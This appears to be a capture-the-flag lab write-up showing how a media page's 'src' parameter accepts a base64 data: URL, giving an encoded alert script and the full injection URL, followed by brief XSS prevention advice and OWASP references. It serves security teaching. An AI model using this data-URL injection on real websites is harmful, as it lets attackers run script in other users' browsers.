
# How to get the flag

Using the python scraping library beautifullsoup, you can have a listing of the links that exists on the site, 
you find the link :
- ?page=media&src=nsa

The src parameter can be modified according to the template

- data:[<mediatype>][;base64],<data>

You can encode an alert script in base64 :
```
<script>alert("hey%20handsome%20;)");</script>
PHNjcmlwdD5hbGVydCgiaGV5JTIwaGFuZHNvbWUlMjA7KSIpOzwvc2NyaXB0Pg==
```


And you get the flag with the URL :
```
http://<IP_ADDRESS>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGV5JTIwaGFuZHNvbWUlMjA7KSIpOzwvc2NyaXB0Pg==
```

# How to prevent attack

You can prevent this attack with input canonicalization and sanitisation.
The sanitization step consists of transforming the values of input data by removing some of their parts or writing them differently.

# Documentation

https://owasp.org/www-community/attacks/xss/

https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs

https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

https://medium.com/codex/three-operations-on-input-data-to-make-your-software-more-secure-e5fc5aca2e70